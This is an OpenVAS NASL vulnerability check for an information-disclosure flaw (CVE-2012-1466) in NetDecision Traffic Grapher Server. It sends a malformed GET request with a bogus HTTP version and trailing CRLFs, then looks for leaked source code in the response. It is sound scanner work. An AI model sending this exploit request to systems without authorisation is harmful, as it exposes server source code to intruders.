###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netdecision_traffic_grapher_srv_info_disc_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# Netmechanica NetDecision Traffic Grapher Server Information Disclosure Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802704");
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2012-1466");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-03-09 13:50:32 +0530 (Fri, 09 Mar 2012)");
  script_name("Netmechanica NetDecision Traffic Grapher Server Information Disclosure Vulnerability");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=481");
  script_xref(name:"URL", value:"http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_PoC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Traffic_Grapher_Server_SourceCode_Disc_Vuln.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8087);
  script_mandatory_keys("NetDecision-HTTP-Server/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to gain sensitive information.");
  script_tag(name:"affected", value:"NetDecision Traffic Grapher Server version 4.5.1");
  script_tag(name:"insight", value:"The flaw is due to an improper validation of malicious HTTP GET
  request to 'default.nd' with invalid HTTP version number followed by multiple
  'CRLF', which discloses the source code of 'default.nd'.");
  script_tag(name:"solution", value:"Upgrade to Traffic Grapher Server 4.6.1 or later.");
  script_tag(name:"summary", value:"This host is running NetDecision Traffic Grapher Server and is
  prone to information disclosure vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.netmechanica.com/downloads/");
  exit(0);
}


include("http_func.inc");

port = get_http_port(default:8087);

banner = get_http_banner(port: port);
if(!banner || "Server: NetDecision-HTTP-Server" >!< banner){
  exit(0);
}

soc = http_open_socket(port);
if(!soc){
  exit(0);
}

req = string("GET /default.nd HTTP/-1111111\r\n\r\n");
send(socket:soc, data:req);

for(i=0; i<9; i++)
{
  send(socket:soc, data:raw_string(0x0d, 0x0a));
  sleep(1);
}

sleep(3);
res = http_recv_body(socket:soc);

if(!res)
{
  http_close_socket(soc);
  exit(0);
}

if(("NetDecision Traffic Grapher Web Interface" >< res) &&
   ("GetNetDecisionSystemDir(ND_LOG_DIR)" >< res) &&
   ("func PopulateProperty" >< res) &&
   ("func PopulateInfo()" >< res))
{
    security_message(port:port);
    http_close_socket(soc);
    exit(0);
}

exit(99);
